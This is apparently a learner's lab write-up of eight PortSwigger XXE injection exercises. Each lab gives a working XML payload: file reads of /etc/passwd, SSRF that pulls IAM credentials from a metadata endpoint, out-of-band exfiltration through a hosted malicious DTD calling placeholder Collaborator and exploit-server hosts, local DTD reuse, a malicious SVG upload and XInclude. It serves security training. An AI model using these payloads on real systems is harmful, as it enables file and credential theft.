# XML External Entity (XXE) Injection — Lab Write-ups

> **Topic:** XXE Injection  
> **Platform:** PortSwigger Web Security Academy  
> **Labs Completed:** All  
> **Tools Used:** Burp Suite (Repeater), XML entity crafting

---

## What is XXE?

XXE happens when an application parses XML input and the XML parser is configured to process external entity references. An attacker can define a custom entity that points to a file on the server (like `/etc/passwd`), a URL, or even trigger out-of-band network requests.

It's particularly nasty because:
- It can read local files from the server
- It can perform server-side request forgery (SSRF)
- In some configurations, it enables remote code execution
- It hides in places you might not expect: file uploads, APIs, document parsers

---

## Lab 1 — XXE to Retrieve Files
**Level:** Apprentice

**What the lab is about:**  
The stock checker feature sends product data as XML. The XML parser processes external entities. Goal: read `/etc/passwd`.

**What I did:**  
Intercepted the stock check request in Burp. Original XML:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
  <productId>1</productId>
  <storeId>1</storeId>
</stockCheck>
```

Added an external entity declaration and referenced it:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck>
  <productId>&xxe;</productId>
  <storeId>1</storeId>
</stockCheck>
```

The response returned the full contents of `/etc/passwd`.

**Key takeaway:**  
If an application parses XML you control, always test for XXE. The `SYSTEM` keyword is what points the entity to an external resource.

**Mitigation:**  
Disable external entity processing in your XML parser. In Java: `factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)`.

---

## Lab 2 — XXE to Perform SSRF
**Level:** Apprentice

**What the lab is about:**  
Same stock checker, but this time instead of reading a local file, you use XXE to make the server send an HTTP request to an internal metadata endpoint (simulating cloud SSRF).

**What I did:**  
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck>
  <productId>&xxe;</productId>
  <storeId>1</storeId>
</stockCheck>
```

The server fetched the AWS-style metadata endpoint and returned the IAM credentials in the response.

**Key takeaway:**  
XXE + SSRF is a powerful combo in cloud environments. EC2 metadata at `169.254.169.254` is a classic target. Finding XXE in a cloud-hosted app is potentially critical.

---

## Lab 3 — Blind XXE with Out-of-Band Interaction
**Level:** Practitioner

**What the lab is about:**  
The application processes XML but doesn't return any output in the response (blind XXE). You need to confirm the vulnerability exists using out-of-band interaction via Burp Collaborator.

**What I did:**  
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> ]>
<stockCheck>
  <productId>&xxe;</productId>
  <storeId>1</storeId>
</stockCheck>
```

Burp Collaborator received a DNS lookup and HTTP request from the target server — confirming blind XXE.

**Key takeaway:**  
Blind XXE is very common. Even if nothing shows up in the response, the server might still be making outbound connections. Always use Collaborator to verify.

---

## Lab 4 — Blind XXE with Out-of-Band Data Exfiltration
**Level:** Practitioner

**What the lab is about:**  
Still blind, but now you actually exfiltrate file contents through DNS/HTTP to your Collaborator server by embedding the data in the request URL.

**What I did:**  
Hosted a malicious DTD on the exploit server:
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://COLLABORATOR/?x=%file;'>">
%eval;
%exfil;
```

Then triggered it from the XXE payload:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://EXPLOIT-SERVER/malicious.dtd"> %xxe;]>
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

The hostname appeared in the Collaborator request URL. This technique is called "parameter entity" XXE.

**Key takeaway:**  
Parameter entities (`%`) are essential for blind exfiltration. They let you build chained entity references that regular entities can't do.

---

## Lab 5 — Blind XXE Using XML Parameter Entities
**Level:** Practitioner

**What the lab is about:**  
Some parsers block regular external entities but still process XML parameter entities. This lab confirms out-of-band interaction using only parameter entities.

**What I did:**  
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://COLLABORATOR"> %xxe;]>
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

The `%xxe;` immediately calls out to Collaborator when the DTD is parsed.

**Key takeaway:**  
Parameter entities are declared with `%` and used with `%` too. They're evaluated during DTD processing before the document body is parsed.

---

## Lab 6 — XXE via Repurposed Local DTD
**Level:** Practitioner

**What the lab is about:**  
When external DTDs are blocked (no outbound connections allowed), you can repurpose an existing DTD file already on the server's filesystem. This is a clever technique for fully internal environments.

**What I did:**  
The server was running Linux with GNOME — which has DTDs at `/usr/share/yelp/dtd/docbookx.dtd`. This DTD defines an entity `ISOamso` that can be overridden.

Injected:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  <!ENTITY % ISOamso '
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
  '>
  %local_dtd;
]>
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

This triggered an error message that included the contents of `/etc/passwd` — error-based data exfiltration without any network calls.

**Key takeaway:**  
Even air-gapped environments can be vulnerable to XXE if local DTDs can be repurposed. This technique is niche but powerful.

---

## Lab 7 — Exploiting XXE via Image File Upload
**Level:** Practitioner

**What the lab is about:**  
SVG files are XML-based, and many image upload endpoints process SVG. Uploading a malicious SVG is a common way to introduce XXE in applications that don't obviously accept XML.

**What I did:**  
Created a file named `exploit.svg`:
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

Uploaded it as an avatar. The application processed the SVG, substituted `&xxe;` with the hostname contents, and displayed it in the rendered image.

**Key takeaway:**  
SVG uploads are a sneaky XXE vector that many developers don't think about. Any feature that parses XML — including SVG, DOCX, XLSX, RSS feeds — is potentially in scope.

---

## Lab 8 — XXE with XInclude Attack
**Level:** Practitioner

**What the lab is about:**  
Sometimes you can't control the full XML document — only a value that gets embedded inside it. Full DOCTYPE manipulation isn't possible. XInclude is an alternative approach.

**What I did:**  
The `productId` parameter was being embedded inside a larger XML document server-side. I injected an XInclude directive directly as the value:
```xml
productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
```

XInclude is processed during XML parsing and doesn't require controlling the DOCTYPE. It fetched and returned `/etc/passwd`.

**Key takeaway:**  
XInclude works even when you only control a fragment of XML, not the full document. It's the go-to for partial XML injection scenarios.

---

*XXE is a great reminder that the attack surface isn't always obvious. File uploads, APIs, document processors — anywhere XML is parsed is potentially vulnerable.*
